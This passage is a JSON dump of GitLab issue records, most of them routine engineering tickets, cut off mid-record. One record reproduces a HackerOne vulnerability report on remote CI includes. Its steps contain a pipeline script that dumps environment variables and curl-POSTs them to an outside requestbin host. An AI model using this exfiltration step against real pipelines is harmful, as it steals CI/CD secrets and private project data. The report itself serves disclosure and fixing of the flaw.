[{"id":91482170,"iid":337735,"project_id":278964,"title":"Upstream many database support to TestProf for BeforeAll AR adapter","description":"The following discussion from !67330 should be addressed:\n\n- [ ] @tkuah started a [discussion](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/67330#note_641505145):  (+1 comment)\n\n    \u003e We should submit a PR to https://github.com/test-prof/test-prof/blob/master/lib/test_prof/before_all/adapters/active_record.rb :) Let's follow-up on this\n\n\n## Proposal\n\nUpstream `spec/support/before_all_adapter.rb` to https://github.com/test-prof/test-prof/blob/master/lib/test_prof/before_all/adapters/active_record.rb.","state":"closed","created_at":"2021-08-05T08:44:46.334Z","updated_at":"2023-01-08T22:44:43.618Z","closed_at":"2023-01-06T10:01:04.631Z","closed_by":{"id":12926454,"username":"rutgerwessels","name":"Rutger Wessels","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/12926454/avatar.png","web_url":"https://gitlab.com/rutgerwessels"},"labels":["Category:Pods","Open Source","Upstream contribution","auto updated","ci-decomposition-followup","devops::data_stores","group::pods","missed:14.4","missed:14.5","pods::active","section::enablement","type::maintenance","workflow::production"],"milestone":{"id":490705,"iid":14,"group_id":9970,"title":"Backlog","description":"Issues that we want to do but are not planned right now. Open for contribution from the community.","state":"active","created_at":"2018-03-22T13:09:23.767Z","updated_at":"2018-10-30T14:56:54.069Z","due_date":null,"start_date":null,"expired":false,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/14"},"assignees":[{"id":12926454,"username":"rutgerwessels","name":"Rutger Wessels","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/12926454/avatar.png","web_url":"https://gitlab.com/rutgerwessels"}],"author":{"id":2535118,"username":"tkuah","name":"Thong Kuah","state":"active","avatar_url":"https://secure.gravatar.com/avatar/f7b51bdd49a4914d29504d7ff4c3f7b9?s=80\u0026d=identicon","web_url":"https://gitlab.com/tkuah"},"type":"ISSUE","assignee":{"id":12926454,"username":"rutgerwessels","name":"Rutger Wessels","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/12926454/avatar.png","web_url":"https://gitlab.com/rutgerwessels"},"user_notes_count":12,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337735","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":1,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 1 checklist item completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337735","notes":"https://gitlab.com/api/v4/projects/278964/issues/337735/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337735/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337735","relative":"#337735","full":"gitlab-org/gitlab#337735"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":8438,"epic":{"id":572791,"iid":8438,"title":"Phase 8: Clean up following decomposition","url":"/groups/gitlab-org/-/epics/8438","group_id":9970,"human_readable_end_date":"Feb 17, 2023","human_readable_timestamp":"\u003cstrong\u003e1\u003c/strong\u003e month remaining"},"iteration":null,"health_status":null},{"id":91481883,"iid":337734,"project_id":278964,"title":"Preprocess service ping to add edition and version for instances that have only operational data","description":"Preprocess service ping in version app before we save to raw_usage_data and usage_data\n\nThe data that should be processed is JSON payloads that don't have edition and version fields and the collected_data_category includes only Standard, Subscription and Operational\n\n```ruby\nif !usage_data.key?(:edition) \u0026\u0026 usage_data.key?(version) \u0026\u0026 usage_data[:collected_data_category].sort == [Standard, Subscription, Operational].sort\nusage_data[:edition] == 'EE'\nusage_data[version] == '14.1'\nend\n```\n\nThis is pseudo-code, would be great to have a double check if I'm missing something\n\n[Dashboard to track Operational Service ping by edition and version](https://app.periscopedata.com/app/gitlab/904191/Alina's-testing-dashboard?widget=12400613\u0026udv=0) \n\n@amandarueda @nicolasdular  could you please confirm this approach? thank you :bow:","state":"closed","created_at":"2021-08-05T08:40:47.425Z","updated_at":"2021-09-27T10:35:28.807Z","closed_at":"2021-08-19T13:22:18.357Z","closed_by":{"id":5365921,"username":"alinamihaila","name":"Alina Mihaila","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5365921/avatar.png","web_url":"https://gitlab.com/alinamihaila"},"labels":["Unplanned","backend","devops::growth","group::product intelligence","missed:14.2","section::growth","type::feature","workflow::in review"],"milestone":{"id":1948702,"iid":63,"group_id":9970,"title":"14.3","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-03-17T21:43:36.613Z","updated_at":"2022-04-21T07:25:29.231Z","due_date":"2021-09-17","start_date":"2021-08-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/63"},"assignees":[{"id":5365921,"username":"alinamihaila","name":"Alina Mihaila","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5365921/avatar.png","web_url":"https://gitlab.com/alinamihaila"}],"author":{"id":5365921,"username":"alinamihaila","name":"Alina Mihaila","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5365921/avatar.png","web_url":"https://gitlab.com/alinamihaila"},"type":"ISSUE","assignee":{"id":5365921,"username":"alinamihaila","name":"Alina Mihaila","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5365921/avatar.png","web_url":"https://gitlab.com/alinamihaila"},"user_notes_count":15,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337734","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337734","notes":"https://gitlab.com/api/v4/projects/278964/issues/337734/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337734/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337734","relative":"#337734","full":"gitlab-org/gitlab#337734"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":91474876,"iid":337728,"project_id":278964,"title":"Move policy yaml content in specs to factory","description":"The following discussion from !66543 should be addressed:\n\n- [ ] @dzaporozhets started a [discussion](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/66543#note_642272665):  (+1 comment)\n\n    \u003e Is it same as in files above? If yes, consider moving it into factory\n\n## Implementation Plan\n\n- [x] ~backend Create new factory in `./ee/spec/factories/security/policy.rb` which creates a security policy of the given type\n- [x] ~backend Find all of the existing policy test fixtures and change them to use the factory. Possible things to search for `let(:policy)`, `let_it_be(:policy)`, `Run DAST in every pipeline`","state":"closed","created_at":"2021-08-05T07:07:40.730Z","updated_at":"2021-10-28T13:54:18.496Z","closed_at":"2021-09-01T09:46:11.603Z","closed_by":{"id":8401507,"username":"sashi_kumar","name":"Sashi Kumar Kumaresan","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8401507/avatar.png","web_url":"https://gitlab.com/sashi_kumar"},"labels":["Category:Security Policy Management","auto updated","backend","devops::govern","group::security policies","maintenance::refactor","section::sec","type::maintenance","workflow::verification"],"milestone":{"id":1948702,"iid":63,"group_id":9970,"title":"14.3","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-03-17T21:43:36.613Z","updated_at":"2022-04-21T07:25:29.231Z","due_date":"2021-09-17","start_date":"2021-08-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/63"},"assignees":[{"id":8401507,"username":"sashi_kumar","name":"Sashi Kumar Kumaresan","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8401507/avatar.png","web_url":"https://gitlab.com/sashi_kumar"}],"author":{"id":8401507,"username":"sashi_kumar","name":"Sashi Kumar Kumaresan","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8401507/avatar.png","web_url":"https://gitlab.com/sashi_kumar"},"type":"ISSUE","assignee":{"id":8401507,"username":"sashi_kumar","name":"Sashi Kumar Kumaresan","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8401507/avatar.png","web_url":"https://gitlab.com/sashi_kumar"},"user_notes_count":6,"merge_requests_count":0,"upvotes":1,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337728","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":3,"completed_count":2},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"2 of 3 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337728","notes":"https://gitlab.com/api/v4/projects/278964/issues/337728/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337728/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337728","relative":"#337728","full":"gitlab-org/gitlab#337728"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":91474805,"iid":337727,"project_id":278964,"title":"Original project is not updated when a remote include .gitlab-ci.yml file is changed","description":"**[HackerOne report #1276845](https://hackerone.com/reports/1276845)** by `justas_b` on 2021-07-24, assigned to @rshambhuni:\n\n[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)\n\n## Report\n\n#####  Summary\n\nWhen a user with a developer role updates remote include .gitlab-ci.yml file, there is no new pipeline run on the original project. Also, there is no notification or update that shows if the remote include .gitlab-ci.yml file has been changed.\n\nA malicious developer can exploit this and modify the remote .gitlab-ci.yml file after he submitted the merge request and the merge request pipeline has been completed. When a maintainer inspects the merge request pipeline, it will only show the previous version of the remote include .gitlab-ci.yml file, and not the updated version. If the maintainer doesn't check the remote  .gitlab-ci.yml file directly and accepts the merge request, the remote .gitlab-ci.yml file executes malicious code on the main branch.\n\nIt is possible to steal project and group ci/cd variables using the \"- export\" command.\n\n#####  Steps to reproduce\n\nAccount A (owner)\n\n1. Create a group and add at least one group ci/cd variable  \n2. Create a project and add at least one project ci/cd variable  \n3. Invite account B to the group and give him a developer role\n\nAccount B (developer)\n\n1. Create a personal project outside the account A's group  \n2. Create a .gitlab-ci.yml file with the following code (on the personal project)\n\n```  \nimage: ruby:latest\n\njob_name2:  \n  script:  \n    - echo \"test\"  \n```\n\n![bandicam_2021-07-24_20-20-54-456.jpg](https://h1.sec.gitlab.net/a/18ab78a1-699b-43ea-b4e7-4310a4fe7d8b/bandicam_2021-07-24_20-20-54-456.jpg)\n\n3. Copy personal project's .gitlab-ci.yml raw url  \n4. Go to the group project where you have a developer role  \n5. Create a new branch with the following changes to .gitlab-ci.yml file:\n\n```  \ninclude:  \n  - '(personal projects .gitlab-ci.yml raw url)'  \n```\n\n![bandicam_2021-07-24_20-20-30-142.jpg](https://h1.sec.gitlab.net/a/4e18ed67-5e70-4560-90ad-326ecd62b4a1/bandicam_2021-07-24_20-20-30-142.jpg)\n\n6. A new pipeline should execute the remote .gitlab-ci.yml code and that pipeline should be displayed on the merge request page\n\n![bandicam_2021-07-24_20-22-42-949.jpg](https://h1.sec.gitlab.net/a/52020761-ddcd-43c6-965f-4907fe51667f/bandicam_2021-07-24_20-22-42-949.jpg)\n\n![bandicam_2021-07-24_20-24-41-238.jpg](https://h1.sec.gitlab.net/a/517a6619-7b4b-435b-9f98-c77cbbe8dbf0/bandicam_2021-07-24_20-24-41-238.jpg)\n\n7. Change the personal project's .gitlab-ci.yml file:\n\n```  \nimage: ruby:latest\n\njob_name2:  \n  script:  \n    - export \u003e test.txt  \n    - curl -X POST --data \"$(cat test.txt)\" https://requestbin.net/r/54l0shea  \n```\n\n![bandicam_2021-07-24_20-25-33-425.jpg](https://h1.sec.gitlab.net/a/330bd229-1d48-4da5-8923-a52eb9ebb274/bandicam_2021-07-24_20-25-33-425.jpg)\n\nAccount A (owner)\n\n8. Go to the merge request page, you should see that there are no new pipelines indicating changes on the remote .gitlab-ci.yml file.\n\n![bandicam_2021-07-24_20-26-39-048.jpg](https://h1.sec.gitlab.net/a/1aa8aefb-3c2e-4349-bf46-ea1a96f34516/bandicam_2021-07-24_20-26-39-048.jpg)\n\n9. Accept the merge request and go to the latest pipeline page. The pipeline runs on the main branch and includes the updated remote .gitlab-ci.yml file.\n\n![bandicam_2021-07-24_20-27-27-673.jpg](https://h1.sec.gitlab.net/a/c82c1988-52f9-4b3a-a1d6-1e6a0a100ab0/bandicam_2021-07-24_20-27-27-673.jpg)\n\n10. The updated remote .gitlab-ci.yml file exports the group and project ci/cd variables and sends them to attacker controlled website using a curl request.\n\n![bandicam_2021-07-24_20-28-25-897.jpg](https://h1.sec.gitlab.net/a/77e763fb-a7e7-4a58-bfce-3b092006de30/bandicam_2021-07-24_20-28-25-897.jpg)\n\n![bandicam_2021-07-24_20-44-33-117.jpg](https://h1.sec.gitlab.net/a/b0314ccb-357f-4642-9ae2-47fb593b9e96/bandicam_2021-07-24_20-44-33-117.jpg)\n\nA practical attack scenario:\n\n- A user includes a non-malicious remote .gitlab-ci.yml file to a project where he only has a developer max role.   \n- For the first few merge requests maintainer probably checks the remote .gitlab-ci.yml file directly and also inspects the merge request pipeline.   \n- After some time, the maintainer stops checking the remote .gitlab-ci.yml file directly (if he ever did in the first place).   \n- Maintainer only inspects the merge request pipeline run and not the remote .gitlab-ci.yml file directly (developer can include multiple remote .gitlab-ci.yml files and inject malicious code into only one of them at the right time)  \n- A developer injects malicious code into the remote .gitlab-ci.yml file he controls - no update on the merge request page  \n- Maintainer merges the request and malicious code gets executed in the main branch (pipeline runs as the maintainer/owner and not developer)\n\n#####  What is the current *bug* behavior?\n\nOriginal project is not updated when a remote include .gitlab-ci.yml file is changed\n\n#####  What is the expected *correct* behavior?\n\nThe original project should be updated when a remote include .gitlab-ci.yml file is changed. It can be done by creating a new pipeline on the original project that executes the changes on the remote .gitlab-ci.yml file as the developer.\n\n#####  Output of checks\n\nThis bug happens on GitLab.com\n\n####  Impact\n\nA user with the developer role can steal project and group ci/cd variables by injecting malicious code into a remote .gitlab-ci.yml file. It is also possible to steal owner's/maintainer's private project files using $CI_JOB_TOKEN.\n\n## Attachments\n\n**Warning:** Attachments received through HackerOne, please exercise caution!\n\n* [bandicam_2021-07-24_20-20-54-456.jpg](https://h1.sec.gitlab.net/a/18ab78a1-699b-43ea-b4e7-4310a4fe7d8b/bandicam_2021-07-24_20-20-54-456.jpg)\n* [bandicam_2021-07-24_20-26-39-048.jpg](https://h1.sec.gitlab.net/a/1aa8aefb-3c2e-4349-bf46-ea1a96f34516/bandicam_2021-07-24_20-26-39-048.jpg)\n* [bandicam_2021-07-24_20-27-27-673.jpg](https://h1.sec.gitlab.net/a/c82c1988-52f9-4b3a-a1d6-1e6a0a100ab0/bandicam_2021-07-24_20-27-27-673.jpg)\n* [bandicam_2021-07-24_20-28-25-897.jpg](https://h1.sec.gitlab.net/a/77e763fb-a7e7-4a58-bfce-3b092006de30/bandicam_2021-07-24_20-28-25-897.jpg)\n* [bandicam_2021-07-24_20-44-33-117.jpg](https://h1.sec.gitlab.net/a/b0314ccb-357f-4642-9ae2-47fb593b9e96/bandicam_2021-07-24_20-44-33-117.jpg)\n* [bandicam_2021-07-24_20-20-30-142.jpg](https://h1.sec.gitlab.net/a/4e18ed67-5e70-4560-90ad-326ecd62b4a1/bandicam_2021-07-24_20-20-30-142.jpg)\n* [bandicam_2021-07-24_20-22-42-949.jpg](https://h1.sec.gitlab.net/a/52020761-ddcd-43c6-965f-4907fe51667f/bandicam_2021-07-24_20-22-42-949.jpg)\n* [bandicam_2021-07-24_20-25-33-425.jpg](https://h1.sec.gitlab.net/a/330bd229-1d48-4da5-8923-a52eb9ebb274/bandicam_2021-07-24_20-25-33-425.jpg)\n* [bandicam_2021-07-24_20-24-41-238.jpg](https://h1.sec.gitlab.net/a/517a6619-7b4b-435b-9f98-c77cbbe8dbf0/bandicam_2021-07-24_20-24-41-238.jpg)\n\n## How To Reproduce\n\nPlease add [reproducibility information] to this section:\n\n1.\n1.\n1.\n\n[reproducibility information]: https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues","state":"closed","created_at":"2021-08-05T07:06:08.585Z","updated_at":"2021-11-18T07:01:55.022Z","closed_at":"2021-11-02T14:42:07.783Z","closed_by":{"id":722076,"username":"matteeyah","name":"Matija Čupić","state":"active","avatar_url":"https://secure.gravatar.com/avatar/8bc04cc15e0adba406cf56fecd9d910a?s=80\u0026d=identicon","web_url":"https://gitlab.com/matteeyah"},"labels":["Category:Pipeline Authoring","Deliverable","HackerOne","Weakness::CWE-99","auto updated","backend","candidate::14.5","devops::verify","group::pipeline authoring","priority::3","section::ops","security","severity::3","workflow::production"],"milestone":{"id":2114817,"iid":66,"group_id":9970,"title":"14.5","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-06-23T04:59:45.082Z","updated_at":"2022-04-21T07:25:45.431Z","due_date":"2021-11-17","start_date":"2021-10-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/66"},"assignees":[{"id":722076,"username":"matteeyah","name":"Matija Čupić","state":"active","avatar_url":"https://secure.gravatar.com/avatar/8bc04cc15e0adba406cf56fecd9d910a?s=80\u0026d=identicon","web_url":"https://gitlab.com/matteeyah"}],"author":{"id":2741139,"username":"gitlab-securitybot","name":"GitLab SecurityBot","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2741139/avatar.png","web_url":"https://gitlab.com/gitlab-securitybot"},"type":"ISSUE","assignee":{"id":722076,"username":"matteeyah","name":"Matija Čupić","state":"active","avatar_url":"https://secure.gravatar.com/avatar/8bc04cc15e0adba406cf56fecd9d910a?s=80\u0026d=identicon","web_url":"https://gitlab.com/matteeyah"},"user_notes_count":20,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":"2021-11-03","confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337727","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337727","notes":"https://gitlab.com/api/v4/projects/278964/issues/337727/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337727/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337727","relative":"#337727","full":"gitlab-org/gitlab#337727"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":{"id":36606,"iid":35,"sequence":2,"group_id":9970,"title":"Pipeline Authoring: November 01, 2021 - November 14, 2021","description":"Target milestone `14.5`","state":3,"created_at":"2021-10-05T20:42:58.372Z","updated_at":"2021-12-21T15:27:22.624Z","start_date":"2021-11-01","due_date":"2021-11-14","web_url":"https://gitlab.com/groups/gitlab-org/-/iterations/36606"},"health_status":null},{"id":91473728,"iid":337724,"project_id":278964,"title":"Can't build license finder locally","description":"### Summary\n\nWhen attempting to build the [license-finder](https://gitlab.com/gitlab-org/security-products/analyzers/license-finder) project locally using the [directions](https://gitlab.com/gitlab-org/security-products/analyzers/license-finder/-/blob/259ca1b7421597a9515d5c82216c324eebcc406e/README.md#L54-56) provided by the `README.md` file, a failure is encountered:\n\n```\n#35 44.60 dpkg: error: cannot access archive '/opt/toolcache/license*.deb': No such file or directory\n------\nexecutor failed running [/bin/sh -c bash /opt/install.sh]: exit code: 2\n```\n\n### Steps to reproduce\n\n```sh\n$ git clone https://gitlab.com/gitlab-org/security-products/analyzers/license-finder.git\n$ cd license-finder\n$ ./bin/docker-build\n\n/usr/local/bin/docker\n[+] Building 83.6s (36/37)\n =\u003e [internal] load build definition from Dockerfile\n...\n =\u003e [stage-1 20/22] COPY config/install.sh /opt/install.sh                                                                                                                         0.0s\n =\u003e ERROR [stage-1 21/22] RUN bash /opt/install.sh                                                                                                                                45.3s\n------\n \u003e [stage-1 21/22] RUN bash /opt/install.sh:\n...\n#35 44.54 Processing triggers for libgdk-pixbuf2.0-0:amd64 (2.38.1+dfsg-1) ...\n#35 44.60 dpkg: error: cannot access archive '/opt/toolcache/license*.deb': No such file or directory\n------\nexecutor failed running [/bin/sh -c bash /opt/install.sh]: exit code: 2\n```\n\n### Example Project\n\n[license-finder](https://gitlab.com/gitlab-org/security-products/analyzers/license-finder)\n\n### What is the current *bug* behavior?\n\nlicense-finder cannot be built locally\n\n### What is the expected *correct* behavior?\n\nit should be possible to build license-finder using the steps provided in the readme file\n\n#### Results of GitLab environment info\n\nFails on local dev machine running `Mac OS X 10.15.7`\n\n### Cause\n\nThe Dockerfile relies on the fact that a latest image exists in the registry with the deb files.\n\nThe current docker build relies on an experimental feature of the buildkit to copy `deb` files from the official `license-finder` image in the registry. It's not clear why this stopped working - it's possible that the implementation changed but since the syntax is [not versioned](https://gitlab.com/gitlab-org/security-products/analyzers/license-finder/-/blob/main/Dockerfile#L1) this particular part of functionality stopped working.\n\n### Proposal\n\nDo not rely on the registry image to get deb files. Build them instead.\n\n### Implementation plan\n\nUpdate [bin/docker-build](https://gitlab.com/gitlab-org/security-products/analyzers/license-finder/-/blob/main/bin/docker-build#L12) to run omnibus to build all the packages on which `license-finder` relies: https://gitlab.com/gitlab-org/security-products/analyzers/license-finder/-/blob/main/.gitlab/deb.yml\n\nWe can use `bin/docker-omnibus` as the template for this update: https://gitlab.com/gitlab-org/security-products/analyzers/license-finder/-/blob/main/bin/docker-omnibus.\n\n### Additionally\n\nConsider removing the buildkit functionality to prevent future build problems with changing implementation.\n\n/cc @brytannia @NicoleSchwartz @gonzoyumo","state":"closed","created_at":"2021-08-05T06:50:41.797Z","updated_at":"2022-12-22T19:15:59.483Z","closed_at":"2022-07-22T15:32:59.047Z","closed_by":{"id":5292351,"username":"sam.white","name":"Sam White","state":"active","avatar_url":"https://secure.gravatar.com/avatar/d467fb024d1858d279e6a36e028436ac?s=80\u0026d=identicon","web_url":"https://gitlab.com/sam.white"},"labels":["Category:License Compliance","GitLab Ultimate","[deprecated] Accepting merge requests","backend","devops::secure","group::composition analysis","maintenance::refactor","priority::4","section::sec","type::maintenance","workflow::ready for development"],"milestone":{"id":490705,"iid":14,"group_id":9970,"title":"Backlog","description":"Issues that we want to do but are not planned right now. Open for contribution from the community.","state":"active","created_at":"2018-03-22T13:09:23.767Z","updated_at":"2018-10-30T14:56:54.069Z","due_date":null,"start_date":null,"expired":false,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/14"},"assignees":[],"author":{"id":1674572,"username":"adamcohen","name":"Adam Cohen","state":"active","avatar_url":"https://secure.gravatar.com/avatar/68fe8da9d9dfc88d0d150808cd364825?s=80\u0026d=identicon","web_url":"https://gitlab.com/adamcohen"},"type":"ISSUE","assignee":null,"user_notes_count":13,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337724","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":3,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337724","notes":"https://gitlab.com/api/v4/projects/278964/issues/337724/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337724/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337724","relative":"#337724","full":"gitlab-org/gitlab#337724"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":91471535,"iid":337723,"project_id":278964,"title":"Can't edit file via single file editor when MR diffs is cached","description":"\u003c!---\nPlease read this!\n\nBefore opening a new issue, make sure to search for keywords in the issues\nfiltered by the \"regression\" or \"bug\" label:\n\n- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=regression\n- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=bug\n\nand verify the issue you're about to submit isn't a duplicate.\n---\u003e\n\n### Summary\n\nWhen user with edit permissions (e.g. MR author) to a file in a merge request tries to edit a file using single file editor and the diffs was already cached (triggered by a non-authenticated user), the user won't be able to edit the file and will be asked to fork instead.\n\n### Steps to reproduce\n\n1. Non-authenticated user (guest) views a MR diff. Gets cached.\n1. Authenticated user who has edit permissions to file (e.g. MR author) views a MR diff and gets cached response.\n1. Authenticated user tries to edit file in single file-editor. It will say that they have to fork it to edit it because they have no perms.\n\n### Example Project\n\nTested it on https://gitlab.com/patrickbajao/verification when `diffs_batch_render_cached` feature flag was turned on.\n\n### What is the current *bug* behavior?\n\nThe user can't edit file using single file editor and was being asked to fork.\n\n### What is the expected *correct* behavior?\n\nThe user should be able to edit the file since they have permission to do so.","state":"closed","created_at":"2021-08-05T06:12:10.265Z","updated_at":"2021-08-13T15:04:46.144Z","closed_at":"2021-08-11T05:15:22.964Z","closed_by":{"id":4901936,"username":"dskim_gitlab","name":"Sincheol (David) Kim","state":"active","avatar_url":"https://secure.gravatar.com/avatar/84a984a56c54d1d31338678421cecc32?s=80\u0026d=identicon","web_url":"https://gitlab.com/dskim_gitlab"},"labels":["backend","devops::create","group::code review","priority::2","section::dev","severity::2","type::bug"],"milestone":{"id":1850126,"iid":62,"group_id":9970,"title":"14.2","description":"","state":"active","created_at":"2021-01-26T16:57:35.404Z","updated_at":"2021-07-22T19:45:42.498Z","due_date":"2021-08-17","start_date":"2021-07-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/62"},"assignees":[{"id":4901936,"username":"dskim_gitlab","name":"Sincheol (David) Kim","state":"active","avatar_url":"https://secure.gravatar.com/avatar/84a984a56c54d1d31338678421cecc32?s=80\u0026d=identicon","web_url":"https://gitlab.com/dskim_gitlab"}],"author":{"id":1884221,"username":"patrickbajao","name":"Patrick Bajao","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/1884221/avatar.png","web_url":"https://gitlab.com/patrickbajao"},"type":"ISSUE","assignee":{"id":4901936,"username":"dskim_gitlab","name":"Sincheol (David) Kim","state":"active","avatar_url":"https://secure.gravatar.com/avatar/84a984a56c54d1d31338678421cecc32?s=80\u0026d=identicon","web_url":"https://gitlab.com/dskim_gitlab"},"user_notes_count":0,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337723","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337723","notes":"https://gitlab.com/api/v4/projects/278964/issues/337723/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337723/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337723","relative":"#337723","full":"gitlab-org/gitlab#337723"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6142,"epic":{"id":285495,"iid":6142,"title":"Cache responses of endpoints used in merge request page","url":"/groups/gitlab-org/-/epics/6142","group_id":9970,"human_readable_end_date":"Oct 17, 2021","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":91470819,"iid":337721,"project_id":278964,"title":"Audit client-side Sentry errors for Integrations","description":"The goal of this issue is to gain a better understanding of gitlab-org/ecosystem-team/team-tasks~3412464 Sentry errors for gitlab-org/ecosystem-team/team-tasks~21094707 (initially raised in https://gitlab.com/gitlab-org/ecosystem-team/team-tasks/-/issues/77#note_642600131).\n\nA follow-up epic may be created as a result of this investigation, with issues to resolve or improve captured exceptions.\n\nSentry link: https://sentry.gitlab.net/gitlab/gitlabcom-clientside/?query=is%3Aunresolved+feature_category%3Aintegrations+lastSeen%3A-4w\u0026statsPeriod=14d","state":"closed","created_at":"2021-08-05T05:42:28.576Z","updated_at":"2022-11-22T19:36:22.146Z","closed_at":"2021-09-17T05:15:46.410Z","closed_by":{"id":259327,"username":"tomquirk","name":"Tom Quirk","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/259327/avatar.png","web_url":"https://gitlab.com/tomquirk"},"labels":["Category:Integrations","Stretch","devops::manage","frontend","group::integrations","meta","reliability","section::dev"],"milestone":{"id":1948702,"iid":63,"group_id":9970,"title":"14.3","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-03-17T21:43:36.613Z","updated_at":"2022-04-21T07:25:29.231Z","due_date":"2021-09-17","start_date":"2021-08-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/63"},"assignees":[{"id":259327,"username":"tomquirk","name":"Tom Quirk","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/259327/avatar.png","web_url":"https://gitlab.com/tomquirk"}],"author":{"id":259327,"username":"tomquirk","name":"Tom 